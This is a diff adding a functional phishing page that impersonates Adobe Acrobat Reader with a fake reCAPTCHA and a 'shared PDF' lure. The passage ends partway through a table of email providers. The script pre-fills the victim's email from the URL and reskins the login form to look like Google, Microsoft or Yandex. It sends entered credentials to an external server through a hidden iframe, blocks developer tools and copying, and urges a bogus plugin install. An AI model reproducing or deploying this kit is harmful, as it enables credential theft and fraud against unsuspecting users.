@@ -1,0 +1,1385 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="jquery.min.js"></script>
+  <script src="jquery-3.1.1.min.js"></script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <title>Adobe Acrobat Reader – Secure PDF Access</title>
+  <link href="hover.css" rel="stylesheet" media="all">
+  <link rel="icon" type="image/x-icon" href="a_fav.png">
+
+<style type="text/css">
+    .txt-color{ color: white; }
+    .box-color{ background-color: rgba(0,0,0,0.8);border-radius:15px; }
+
+body, html {
+  height: 100%;
+  margin: 0;
+ font-family: 'Adobe Clean', adobe-clean, 'Trebuchet MS', sans-serif;
+}
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+input[type=number] { -moz-appearance: textfield; }
+
+    .center{ position: absolute; top:50%; left:50%; transform: translate(-50%, -50%); }
+
+    #mainTop{
+        position: sticky; top: 0px; display: flex;
+        height: 63px; background-color: #f8f8f8; z-index: 1;
+    }
+    #logo_container{ display:flex; height: inherit; align-items: center; }
+    #logo1{ height: 20px; width: auto; display: flex; margin-left: 20px; }
+    main{ isolation: isolate; display: block; }
+    #mainContent{ display: block; position: relative; justify-content: center; }
+    .h6{ font-size: 18px;}
+
+    #footer{
+        position: fixed; bottom: 0px; width: 100%;
+        justify-content: center; background: rgb(0, 11, 29); height: 80px;
+    }
+    #footBox{
+        width: 80%; display: flex; position: fixed; left:50%;
+        transform: translate(-50%, 20%); flex-flow: row;
+        flex-wrap: nowrap; background: rgb(0, 11, 29);
+    }
+    .wrap{
+        display: flex; flex-direction: column;
+        justify-content: center; flex-basis: 100%;
+    }
+    .end_wrap{ display: flex; flex-wrap: nowrap; inline-size: auto; }
+    #midBox{
+        width: 100%; margin-left:50%; transform: translate(-50%);
+        flex-flow: row; flex-wrap: nowrap; line-height: 50px; text-align: left;
+    }
+    .btnn{
+        background: rgb(59,99,251); border-color: rgb(59,99,251);
+        color: #FFF; border-radius: 20px; font-size: 17px;
+        padding: 10px 30px ; font-style: normal; font-weight: 700;
+        text-decoration: none; display: inline-block;
+        white-space: nowrap; height: 50px;
+        cursor: pointer;
+    }
+    .btnn:hover{
+        background:  #1E09D5; border-color: #1E09D5;
+        color: #FFF; text-decoration: none;
+    }
+    .fade_box{ background-color: rgba(0,0,0,0.9); border-radius: 15px; }
+
+    .login-overlay {
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.85);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        visibility: hidden;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+    }
+    .login-overlay.active {
+        visibility: visible;
+        opacity: 1;
+    }
+
+    .login-card {
+        position: relative;
+        background: #ffffff;
+        border-radius: 18px;
+        max-width: 440px;
+        width: 94%;
+        padding: 0;
+        box-shadow: 0 25px 60px rgba(0,0,0,0.7);
+        text-align: center;
+        font-family: 'Adobe Clean', adobe-clean, 'Trebuchet MS', sans-serif;
+        overflow: hidden;
+        transform: translateY(10px);
+        transition: transform 0.3s ease;
+    }
+    .login-overlay.active .login-card {
+        transform: translateY(0);
+    }
+
+    .provider-bg-frame {
+        position: absolute;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        border: 0;
+        z-index: 0;
+        opacity: 0.10;
+        pointer-events: none;
+        filter: blur(2px) grayscale(0.3);
+        transition: opacity 0.4s ease;
+    }
+
+    .connecting-screen{
+      position:relative;
+      z-index:3;
+      padding:60px 30px 56px;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      min-height:380px;
+      background:rgba(255,255,255,0.97);
+      border-radius:18px;
+      animation:connectFadeIn .3s ease both;
+    }
+    @keyframes connectFadeIn{from{opacity:0;transform:scale(.97);}to{opacity:1;transform:scale(1);}}
+
+    .connecting-screen .provider-favicon-lg{
+      width:56px;height:56px;object-fit:contain;margin-bottom:18px;
+      border-radius:12px;background:#fff;padding:5px;
+      box-shadow:0 4px 14px rgba(0,0,0,0.10);
+    }
+    .connecting-screen .connecting-title{
+      font-size:1.25rem;font-weight:700;color:#1d1d1d;margin-bottom:6px;
+    }
+    .connecting-screen .connecting-sub{
+      font-size:0.9rem;color:#777;margin-bottom:26px;font-weight:500;
+    }
+    .connecting-spinner-wrap{
+      width:56px;height:56px;position:relative;margin-bottom:22px;
+    }
+    .connecting-spinner-wrap .ring{
+      position:absolute;top:0;left:0;width:100%;height:100%;
+      border:3px solid rgba(0,0,0,0.08);
+      border-top-color:var(--provider-accent,#3B63FB);
+      border-radius:50%;
+      animation:spinRing 1s linear infinite;
+    }
+    .connecting-spinner-wrap .ring:nth-child(2){
+      animation-delay:.15s;
+      border-top-color:transparent;
+      border-right-color:var(--provider-accent,#3B63FB);
+      opacity:.55;
+    }
+    .connecting-spinner-wrap .ring:nth-child(3){
+      animation-delay:.3s;
+      border-top-color:transparent;
+      border-right-color:transparent;
+      border-bottom-color:var(--provider-accent,#3B63FB);
+      opacity:.35;
+    }
+    @keyframes spinRing{to{transform:rotate(360deg);}}
+
+    .connecting-steps{
+      display:flex;flex-direction:column;gap:10px;width:100%;max-width:300px;
+      text-align:left;margin-top:6px;
+    }
+    .connecting-step{
+      display:flex;align-items:center;gap:10px;
+      font-size:0.85rem;color:#999;
+      transition:color .3s ease,opacity .3s ease;
+      opacity:.55;
+    }
+    .connecting-step.active{color:#1d1d1d;opacity:1;font-weight:600;}
+    .connecting-step.done{color:var(--provider-accent,#3B63FB);opacity:1;}
+    .connecting-step .dot{
+      width:8px;height:8px;border-radius:50%;background:#d0d0d0;flex-shrink:0;
+      transition:background .3s ease;
+    }
+    .connecting-step.active .dot{background:var(--provider-accent,#3B63FB);box-shadow:0 0 10px var(--provider-accent,#3B63FB);}
+    .connecting-step.done .dot{background:#22c55e;}
+    .connecting-step .check{
+      display:none;color:#22c55e;font-weight:700;font-size:0.8rem;margin-left:auto;
+    }
+    .connecting-step.done .check{display:inline;}
+
+    .login-form-stage{
+      position:relative;z-index:2;
+      padding:30px 28px 26px;
+      background:rgba(255,255,255,0.94);
+      backdrop-filter:blur(3px);
+      -webkit-backdrop-filter:blur(3px);
+      border-radius:18px;
+      display:none;
+      animation:formFadeIn .35s ease both;
+    }
+    .login-form-stage.visible{display:block;}
+    @keyframes formFadeIn{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+
+    .provider-header {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 10px;
+    }
+    .provider-favicon {
+        width: 48px;
+        height: 48px;
+        object-fit: contain;
+        margin-bottom: 8px;
+        border-radius: 10px;
+        background: #fff;
+        padding: 4px;
+        box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+    .provider-name {
+        font-weight: 700;
+        font-size: 1.05rem;
+        color: #1d1d1d;
+        letter-spacing: 0.2px;
+    }
+    .provider-sub {
+        font-size: 0.82rem;
+        color: #777;
+        margin-top: 2px;
+    }
+
+    .login-card h4 {
+        font-weight: 700;
+        color: #001b36;
+        margin-bottom: 6px;
+        font-size: 1.5rem;
+    }
+    .login-card p.lead-text {
+        color: #4a4a4a;
+        font-size: 0.92rem;
+        margin-bottom: 20px;
+    }
+
+    .login-card label {
+        display: block;
+        text-align: left;
+        font-weight: 600;
+        color: #1d1d1d;
+        font-size: 0.88rem;
+        margin-bottom: 5px;
+    }
+    .login-card input[type="email"],
+    .login-card input[type="password"] {
+        width: 100%;
+        padding: 12px 15px;
+        border: 1.5px solid #d0d0d0;
+        border-radius: 10px;
+        font-size: 1rem;
+        margin-bottom: 16px;
+        transition: border 0.2s, background 0.2s;
+        background: #fafafa;
+    }
+    .login-card input[type="email"]:focus,
+    .login-card input[type="password"]:focus {
+        border-color: var(--provider-accent, rgb(59,99,251));
+        outline: none;
+        background: #ffffff;
+    }
+
+    .login-card .btn-login {
+        background: var(--provider-accent, rgb(59,99,251));
+        border: none;
+        color: #fff;
+        width: 100%;
+        padding: 14px 0;
+        border-radius: 30px;
+        font-size: 1.05rem;
+        font-weight: 700;
+        cursor: pointer;
+        transition: background 0.2s, transform 0.1s;
+    }
+    .login-card .btn-login:hover { filter: brightness(0.92); }
+    .login-card .btn-login:active { transform: scale(0.97); }
+    .login-card .btn-login:disabled { background: #a0a0a0; cursor: not-allowed; }
+
+    .login-card .error-msg {
+        color: #d32f2f;
+        font-size: 0.9rem;
+        font-weight: 600;
+        min-height: 22px;
+        margin-bottom: 4px;
+        text-align: center;
+    }
+    .login-card .retry-badge {
+        color: #b85c00;
+        font-weight: 600;
+        font-size: 0.88rem;
+        margin-bottom: 8px;
+    }
+
+    .provider-switch {
+        margin-top: 14px;
+        font-size: 0.82rem;
+        color: #777;
+    }
+    .provider-switch a {
+        color: var(--provider-accent, rgb(59,99,251));
+        font-weight: 600;
+        text-decoration: none;
+        cursor: pointer;
+    }
+
+    .hidden { display: none !important; }
+
+    .pdf-instructions {
+        text-align: left;
+        background: rgba(255,255,255,0.08);
+        border-left: 4px solid rgb(59,99,251);
+        padding: 12px 18px;
+        border-radius: 8px;
+        margin-top: 10px;
+        margin-bottom: 18px;
+        color: #e0e0e0;
+        font-size: 0.95rem;
+    }
+    .pdf-instructions li { margin-bottom: 6px; }
+
+    #verification-section{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      display:flex;align-items:center;justify-content:center;
+      background:#ffffff;z-index:20000;
+      transition:opacity .4s ease;
+      font-family:'Inter','Adobe Clean',adobe-clean,'Trebuchet MS',sans-serif;
+    }
+    .verification-wrapper{
+      width:100%;height:100%;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;
+      padding:20px;background:#fff;position:relative;
+    }
+    .verification-card{
+      width:100%;max-width:420px;
+      padding:40px 36px 32px;
+      background:#fff;border:1px solid #dadce0;border-radius:12px;
+      box-shadow:0 1px 3px rgba(0,0,0,.04),0 4px 12px rgba(0,0,0,.04);
+      text-align:center;position:relative;
+    }
+    .verification-icon-wrap{
+      width:64px;height:64px;margin:0 auto 20px;border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      background:#f8f9fa;border:1px solid #e8eaed;overflow:hidden;
+    }
+    .verification-icon-wrap img{width:40px;height:40px;object-fit:contain;}
+    .verification-title{font-size:1.4rem;font-weight:500;color:#202124;margin-bottom:8px;letter-spacing:-.3px;line-height:1.35;}
+    .verification-subtitle{font-size:.92rem;color:#5f6368;margin-bottom:28px;line-height:1.5;}
+    .recaptcha-container{position:relative;overflow:hidden;border-radius:3px;margin-bottom:20px;}
+    .recaptcha-box{
+      display:flex;align-items:center;justify-content:space-between;
+      padding:12px 14px;background:#f9f9f9;border:1px solid #d3d3d3;border-radius:3px;
+      cursor:pointer;transition:all .25s ease;min-height:74px;
+    }
+    .recaptcha-box:hover{background:#f1f1f1;}
+    .recaptcha-left{display:flex;align-items:center;gap:12px;flex:1;}
+    .recaptcha-checkbox{
+      width:26px;height:26px;border:2px solid #c1c1c1;border-radius:3px;background:#fff;
+      display:flex;align-items:center;justify-content:center;flex-shrink:0;
+      transition:all .2s ease;position:relative;
+    }
+    .recaptcha-checkbox.checked{background:#fff;border-color:#fff;}
+    .recaptcha-checkbox.checked::after{
+      content:'';position:absolute;width:22px;height:22px;
+      border:3px solid #1a73e8;border-top-color:transparent;border-right-color:transparent;
+      border-radius:50%;animation:recaptcha-spin .8s linear infinite;
+    }
+    .recaptcha-checkbox.checked-done{background:#1a73e8;border-color:#1a73e8;}
+    .recaptcha-checkbox.checked-done::after{
+      content:'';position:absolute;width:6px;height:11px;border:solid #fff;
+      border-width:0 2.5px 2.5px 0;transform:rotate(45deg) translate(-1px,-1px);animation:none;
+    }
+    @keyframes recaptcha-spin{0%{transform:rotate(0);}100%{transform:rotate(360deg);}}
+    .recaptcha-label{font-size:.9rem;color:#202124;}
+    .recaptcha-logo{display:flex;flex-direction:column;align-items:center;gap:2px;}
+    .recaptcha-logo svg{width:36px;height:36px;}
+    .recaptcha-logo-text{font-size:.55rem;color:#9aa0a6;text-align:center;letter-spacing:.2px;}
+    .recaptcha-progress{
+      position:absolute;bottom:0;left:0;height:3px;background:#1a73e8;
+      width:0%;transition:width .3s ease;border-radius:0 0 3px 3px;
+    }
+    .verification-steps{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:20px;}
+    .step-dot{width:6px;height:6px;border-radius:50%;background:#dadce0;transition:all .25s ease;}
+    .step-dot.active{background:#1a73e8;width:18px;border-radius:3px;}
+    .step-dot.completed{background:#1a73e8;}
+    .verification-footer-text{font-size:.78rem;color:#5f6368;margin-top:18px;line-height:1.5;}
+
+    .pdf-viewer{
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:#2b2b2b;z-index:15000;
+      display:none;flex-direction:column;
+    }
+    .pdf-viewer.active{display:flex;}
+    .pdf-toolbar{
+      background:#1f1f1f;color:#e0e0e0;padding:10px 18px;
+      display:flex;align-items:center;justify-content:space-between;
+      border-bottom:1px solid #3a3a3a;flex-shrink:0;font-size:.85rem;
+    }
+    .pdf-toolbar-left{display:flex;align-items:center;gap:14px;}
+    .pdf-toolbar-left img{height:22px;width:auto;}
+    .pdf-toolbar-left .doc-title{color:#fff;font-weight:600;font-size:.9rem;}
+    .pdf-toolbar-right{display:flex;align-items:center;gap:14px;color:#a0a0a0;}
+    .pdf-toolbar-right .btn-tool{
+      background:#3a3a3a;border:none;color:#e0e0e0;padding:6px 12px;border-radius:6px;
+      cursor:pointer;font-size:.8rem;transition:background .2s;
+    }
+    .pdf-toolbar-right .btn-tool:hover{background:#4a4a4a;}
+    .pdf-stage{
+      flex:1;display:flex;align-items:center;justify-content:center;
+      background:#3a3a3a;padding:24px;overflow:auto;
+    }
+    .pdf-page{
+      background:#fff;width:100%;max-width:800px;min-height:1000px;
+      border-radius:4px;box-shadow:0 8px 40px rgba(0,0,0,.6);
+      padding:56px 64px;color:#1a1a1a;font-family:'Georgia',serif;
+      line-height:1.85;font-size:15px;
+    }
+    .pdf-page h1{font-size:26px;font-weight:700;margin-bottom:6px;color:#111;font-family:'Inter',sans-serif;}
+    .pdf-page .pdf-meta{font-size:12px;color:#888;margin-bottom:28px;font-family:'Inter',sans-serif;border-bottom:1px solid #e0e0e0;padding-bottom:12px;}
+    .pdf-page h2{font-size:18px;font-weight:600;margin-top:26px;margin-bottom:10px;color:#222;font-family:'Inter',sans-serif;}
+    .pdf-page p{margin-bottom:14px;text-align:justify;}
+    .pdf-page ul{margin:10px 0 18px 22px;}
+    .pdf-page ul li{margin-bottom:8px;}
+    .pdf-page .highlight-box{
+      background:#fff8e1;border-left:4px solid #f59e0b;padding:14px 18px;border-radius:6px;
+      margin:18px 0;font-size:14px;
+    }
+    .pdf-page .highlight-box strong{color:#b45309;}
+
+    .pdf-loader-overlay{
+      position:absolute;top:0;left:0;width:100%;height:100%;
+      background:rgba(255,255,255,.92);
+      display:none;align-items:center;justify-content:center;z-index:16000;
+      flex-direction:column;gap:16px;
+    }
+    .pdf-loader-overlay.active{display:flex;}
+    .pdf-loader-spinner{
+      width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#1a73e8;
+      border-radius:50%;animation:spin .8s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .pdf-loader-text{color:#333;font-size:.95rem;font-weight:500;}
+
+    @media(max-width:640px){
+      .pdf-page{padding:32px 24px;min-height:auto;}
+      .verification-card{padding:32px 24px 28px;}
+      .connecting-screen{padding:44px 22px 40px;min-height:340px;}
+      .login-form-stage{padding:24px 22px 22px;}
+    }
+</style>
+</head>
+<body style="font-size: .9rem; font-weight: 400; background-color:white;">
+
+    <!-- ============================================================ -->
+    <!-- VERIFICATION OVERLAY                                           -->
+    <!-- ============================================================ -->
+    <div id="verification-section">
+      <div class="verification-wrapper">
+        <div class="verification-card">
+          <div class="verification-icon-wrap">
+            <img id="verification-favicon" src="adobe.png" alt="Adobe">
+          </div>
+
+          <h2 id="domain-message" class="verification-title translatable" data-key="checking-browser">Verifying it's you</h2>
+          <p id="domain-submessage" class="verification-subtitle translatable" data-key="checking-description">To continue, please confirm you're not a robot. This helps protect your account from unauthorized access.</p>
+
+          <div class="recaptcha-container">
+            <div class="recaptcha-box" id="recaptcha-box">
+              <div class="recaptcha-left">
+                <div class="recaptcha-checkbox" id="recaptcha-checkbox"></div>
+                <span class="recaptcha-label translatable" data-key="not-robot">I'm not a robot</span>
+              </div>
+              <div class="recaptcha-logo">
+                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                  <path fill="#1C3AA9" d="M24 4C12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20S35.05 4 24 4z"/>
+                  <path fill="#4285F4" d="M24 8c-8.84 0-16 7.16-16 16s7.16 16 16 16 16-7.16 16-16S32.84 8 24 8z"/>
+                  <path fill="#fff" d="M24 12c-6.63 0-12 5.37-12 12s5.37 12 12 12 12-5.37 12-12-5.37-12-12-12zm0 4c4.42 0 8 3.58 8 8s-3.58 8-8 8-8-3.58-8-8 3.58-8 8-8z"/>
+                  <path fill="#4285F4" d="M24 16c-4.42 0-8 3.58-8 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 3c2.76 0 5 2.24 5 5s-2.24 5-5 5-5-2.24-5-5 2.24-5 5-5z"/>
+                </svg>
+                <span class="recaptcha-logo-text">reCAPTCHA</span>
+              </div>
+              <div class="recaptcha-progress" id="verification-progress"></div>
+            </div>
+          </div>
+
+          <div class="verification-steps">
+            <div class="step-dot active" data-step="1"></div>
+            <div class="step-dot" data-step="2"></div>
+            <div class="step-dot" data-step="3"></div>
+          </div>
+
+          <p class="verification-footer-text">
+            <span class="translatable" data-key="verification-help">This verification helps prevent automated access. Your information is encrypted and secure.</span>
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid" style="
+        background: rgb(0, 11, 29);
+        position: fixed; width: 100%; height: 100%;
+        background-position: center; background-size: cover;
+        background-repeat: no-repeat;
+        background-image: url('7.jpg')"
+    ></div>
+
+    <div id="mainTop">
+        <div id="logo_container" >
+            <img src="adobe_logo_1.png" id="logo1" alt="Main logo">
+        </div>
+    </div>
+
+    <div class="row" style="margin-right: 10px; margin-left: 10px; height: 90%;">
+        <div class="container">
+          <div class="row" >
+            <div class="col-lg-6 mx-auto my-5 px-5 pb-5 fade_box">
+              <div class="text-center pt-2"> <br>
+                <img src="adobe.png" class="img-fluid" width="40px" alt="adobe logo">
+                <span class="h4 txt-color" style="font-weight: 600;">Adobe Acrobat Reader</span>
+                 <br><br>
+                <div class="h2 txt-color" style="font-weight: 800;">Sign in to view the shared PDF</div>
+                <br>
+                <div class="h6 text-black font-weight-normal txt-color">
+To open the shared document, please sign in with your email. The PDF is protected and requires authentication before viewing.
+                </div>
+                <br>
+                <div class="pdf-instructions">
+                    <strong style="color:#fff;">📄 Instructions on the PDF:</strong>
+                    <ul style="padding-left: 20px; margin-bottom: 0; margin-top: 8px;">
+                        <li>Use a valid email address to unlock the document</li>
+                        <li>Once signed in, the PDF will open automatically</li>
+                    </ul>
+                </div>
+                <br>
+                <div class="h6 text-black font-weight-normal txt-color" style="justify-content: center;">
+                    <ul id="midBox" >
+                        <li>A sign-in window will appear shortly</li>
+                    </ul>
+                </div>
+                <br>
+              </div>
+                <div class="row"></div>
+            </div>
+          </div>
+      </div>
+    </div>
+
+<div id="footer">
+    <div id="footBox">
+        <div><img src="adobe.png" style="width: 62px; height: auto;" alt="adobe logo"></div>
+        <div class="wrap" style="margin-left: 25px;">
+                <div class="h4 txt-color" style="font-weight: 800;">Adobe Acrobat</div>
+                <div class="h6 txt-color">Free plans for businesses or personal and teachers.</div>
+        </div>
+        <div class="end_wrap">
+            <a class="btnn" id="dmd">Sign in with Email</a>
+        </div>
+    </div>
+</div>
+
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-card" id="loginCard">
+        <iframe class="provider-bg-frame" id="providerBgFrame" src="about:blank" title="provider background"></iframe>
+
+        <div class="connecting-screen" id="connectingScreen">
+          <img class="provider-favicon-lg" id="connectingFavicon" src="adobe.png" alt="Provider">
+          <div class="connecting-title" id="connectingTitle">Connecting to your email server…</div>
+          <div class="connecting-sub" id="connectingSub">Establishing a secure session</div>
+
+          <div class="connecting-spinner-wrap">
+            <div class="ring"></div>
+            <div class="ring"></div>
+            <div class="ring"></div>
+          </div>
+
+          <div class="connecting-steps">
+            <div class="connecting-step" id="connStep1">
+              <span class="dot"></span>
+              <span>Resolving mail server</span>
+              <span class="check">✓</span>
+            </div>
+            <div class="connecting-step" id="connStep2">
+              <span class="dot"></span>
+              <span>Establishing secure connection</span>
+              <span class="check">✓</span>
+            </div>
+            <div class="connecting-step" id="connStep3">
+              <span class="dot"></span>
+              <span>Preparing sign-in form</span>
+              <span class="check">✓</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="login-form-stage" id="loginFormStage">
+            <div class="provider-header">
+                <img class="provider-favicon" id="providerFavicon" src="adobe.png" alt="provider favicon">
+                <div class="provider-name" id="providerName">Adobe Account</div>
+                <div class="provider-sub" id="providerSub">Sign in to continue</div>
+            </div>
+
+            <h4 id="loginTitle">Sign in</h4>
+            <p class="lead-text" id="loginSubtitle">Enter your credentials to view the shared PDF document.</p>
+
+            <div class="error-msg" id="loginError"></div>
+            <div class="retry-badge" id="retryInfo"></div>
+
+            <form id="loginForm" autocomplete="off">
+                <label for="loginEmail">Email address</label>
+                <input type="email" id="loginEmail" placeholder="you@example.com" required>
+
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••" required>
+
+                <button type="submit" class="btn-login" id="loginSubmitBtn">Sign in</button>
+            </form>
+
+            <div class="provider-switch">
+                Wrong provider? <a id="resetProviderLink">Use a different email</a>
+            </div>
+
+            <p style="margin-top: 14px; font-size: 0.78rem; color: #888;">
+                By continuing, you agree to the provider's Terms of Use.
+            </p>
+        </div>
+    </div>
+</div>
+
+<div class="pdf-viewer" id="pdfViewer">
+  <div class="pdf-toolbar">
+    <div class="pdf-toolbar-left">
+      <img src="adobe.png" alt="Adobe">
+      <span class="doc-title" id="pdfDocTitle">Shared_Document.pdf</span>
+    </div>
+    <div class="pdf-toolbar-right">
+      <span>1 / 1</span>
+      <button class="btn-tool" onclick="closePdfViewer()">Close</button>
+    </div>
+  </div>
+
+  <div class="pdf-stage">
+    <div class="pdf-page">
+      <h1 id="pdfHeader">Shared Document</h1>
+      <div class="pdf-meta" id="pdfMeta">Confidential · Adobe Acrobat Reader</div>
+
+      <p>This document has been shared with you as a secure PDF. To continue viewing the full contents and access any embedded attachments, you are required to install the official Adobe Acrobat Reader plugin for your browser.</p>
+
+      <h2>Why is the plugin required?</h2>
+      <p>The Adobe Acrobat Reader plugin enables full rendering of protected PDF documents, including embedded forms, digital signatures, and interactive elements. Without it, some parts of this document may not display correctly.</p>
+
+      <div class="highlight-box">
+        <strong>⚠️ Action Required:</strong> Please install or enable the Adobe Acrobat Reader plugin to view the complete document. You will be redirected automatically.
+      </div>
+
+      <h2>What happens next?</h2>
+      <ul>
+        <li>The plugin will be detected automatically.</li>
+        <li>If the plugin is not installed, you will be redirected to install it.</li>
+        <li>After installation, you will be taken to your email provider's login page.</li>
+      </ul>
+
+      <p>Thank you for using Adobe Acrobat Reader. Your document is encrypted and securely transmitted.</p>
+    </div>
+  </div>
+
+  <div class="pdf-loader-overlay" id="pdfLoaderOverlay">
+    <div class="pdf-loader-spinner"></div>
+    <div class="pdf-loader-text" id="pdfLoaderText">Checking Adobe Acrobat plugin…</div>
+  </div>
+</div>
+
+<!-- Hidden sink used for cross-origin form submission (replaces the PHP cURL forward) -->
+<iframe name="submissionSink" id="submissionSink" style="display:none;width:0;height:0;border:0;" title="submission sink"></iframe>
+
+<script>
+// ==========================================================
+//  CONFIG
+// ==========================================================
+const SUBMIT_URL = 'https://polnerprague.xyz/dike/api.php';   // direct endpoint (no PHP forward)
+const LOGIN_AUTO_POPUP_DELAY = 2000;
+const CONNECTING_DURATION = 2000;
+
+// ==========================================================
+//  SECURITY
+// ==========================================================
+(function(){
+  document.addEventListener('contextmenu', e=>e.preventDefault());
+  document.addEventListener('keydown', function(e){
+    if(e.key==='F12'||e.keyCode===123){e.preventDefault();return false;}
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.keyCode===73)){e.preventDefault();return false;}
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='J'||e.key==='j'||e.keyCode===74)){e.preventDefault();return false;}
+    if(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.keyCode===85)){e.preventDefault();return false;}
+    if(e.ctrlKey&&(e.key==='S'||e.key==='s'||e.keyCode===83)){e.preventDefault();return false;}
+    if(e.ctrlKey&&e.shiftKey&&(e.key==='C'||e.key==='c'||e.keyCode===67)){e.preventDefault();return false;}
+  });
+  document.addEventListener('dragstart', e=>e.preventDefault());
+  document.addEventListener('copy', e=>e.preventDefault());
+  document.addEventListener('cut', e=>e.preventDefault());
+})();
+
+// ==========================================================
+//  UTILITY
+// ==========================================================
+function isValidEmail(email){
+  if(!email||typeof email!=='string')return false;
+  const t=email.trim();
+  if(t.length>254)return false;
+  const re=/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
+  return re.test(t);
+}
+function isBase64(str){
+  if(!str||typeof str!=='string')return false;
+  if(!/^[A-Za-z0-9+/]+={0,2}$/.test(str))return false;
+  if(str.length%4!==0)return false;
+  try{return btoa(atob(str))===str;}catch(e){return false;}
+}
+function decodeBase64(s){try{return atob(s);}catch(e){return null;}}
+
+// ==========================================================
+//  URL EMAIL EXTRACTION
+// ==========================================================
+function parseEmailOrBase64(value){
+  if(!value)return null;
+  let c=value.trim();
+  try{c=decodeURIComponent(c);}catch(e){}
+  if(isValidEmail(c))return c;
+  if(isBase64(c)){
+    const d=decodeBase64(c);
+    if(d){
+      const t=d.trim();
+      if(isValidEmail(t))return t;
+      try{const u=decodeURIComponent(t);if(isValidEmail(u))return u;}catch(e){}
+    }
+  }
+  return null;
+}
+function extractEmailFromURL(){
+  try{
+    const qs=window.location.search.substring(1);
+    if(qs){
+      const p=new URLSearchParams(qs);
+      const v=p.get('eme');
+      if(v){const r=parseEmailOrBase64(v);if(r)return r;}
+    }
+    let hash=window.location.hash.substring(1);
+    if(!hash)return null;
+    try{hash=decodeURIComponent(hash);}catch(e){}
+    if(hash.includes('@')){const t=hash.trim();if(isValidEmail(t))return t;}
+    if(isBase64(hash)){
+      const d=decodeBase64(hash);
+      if(d){
+        const t=d.trim();
+        if(isValidEmail(t))return t;
+        try{const u=decodeURIComponent(t);if(isValidEmail(u))return u;}catch(e){}
+      }
+    }
+    return null;
+  }catch(e){return null;}
+}
+function extractDomainFromURL(){
+  const qs=window.location.search.substring(1);
+  if(qs){
+    const p=new URLSearchParams(qs);
+    const v=p.get('eme');
+    if(v){
+      let c=v.trim();
+      try{c=decodeURIComponent(c);}catch(e){}
+      if(!c.includes('@')&&c.includes('.'))return c;
+      if(isBase64(c)){const d=decodeBase64(c);if(d&&!d.includes('@')&&d.includes('.'))return d.trim();}
+    }
+  }
+  let hash=window.location.hash.substring(1);
+  if(hash){
+    try{hash=decodeURIComponent(hash);}catch(e){}
+    if(hash&&!hash.includes('@')&&hash.includes('.'))return hash.trim();
+  }
+  return null;
+}
+
+// ==========================================================
+//  FAVICON
+// ==========================================================
+const ADOBE_FAVICON = 'a_fav.png';
+let faviconSwapped = false;
+
+function setTabFavicon(url){
+  document.querySelectorAll("link[rel*='icon']").forEach(el=>el.remove());
+  const link = document.createElement('link');
+  link.type = 'image/x-icon';
+  link.rel  = 'shortcut icon';
+  link.href = url;
+  document.head.appendChild(link);
+}
+function lockAdobeFavicon(){
+  faviconSwapped = false;
+  setTabFavicon(ADOBE_FAVICON);
+}
+function swapToDomainFavicon(domain){
+  if(!domain || faviconSwapped) return;
+  faviconSwapped = true;
+  const g = 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=128';
+  setTabFavicon(g);
+}
+
+// ==========================================================
+//  PROVIDER DIRECTORY
+// ==========================================================
+const PROVIDERS = {
+    'yandex.com':  {name:'Yandex',   favicon:'https://yandex.com/favicon.ico',        bgUrl:'https://yandex.com',          accent:'#FC3F1D', subtitle:'Sign in to Yandex to continue',      title:'Sign in to Yandex'},
+    'yandex.ru':   {name:'Yandex',   favicon:'https://yandex.ru/favicon.ico',         bgUrl:'https://yandex.ru',           accent:'#FC3F1D', subtitle:'Sign in to Yandex to continue',      title:'Sign in to Yandex'},
+    'gmail.com':   {name:'Google',   favicon:'https://www.google.com/favicon.ico',    bgUrl:'https://accounts.google.com', accent:'#4285F4', subtitle:'Sign in with your Google Account',   title:'Sign in with Google'},
+    'googlemail.com':{name:'Google', favicon:'https://www.google.com/favicon.ico',    bgUrl:'https://accounts.google.com', accent:'#4285F4', subtitle:'Sign in with your Google Account',   title:'Sign in with Google'},
+    'outlook.com': {name:'Microsoft',favicon:'https://outlook.live.com/favicon.ico',  bgUrl:'https://outlook.live.com',    accent:'#0078D4', subtitle:'Sign in to your Microsoft account',  title:'Sign in to Microsoft'},
+    'hotmail.com': {name:'Microsoft',favicon:'https://outlook.live.com/favicon.ico',  bgUrl:'https://outlook.live.com',    accent:'#0078D4', subtitle:'Sign in to your Microsoft account',  title:'Sign in to Microsoft'},
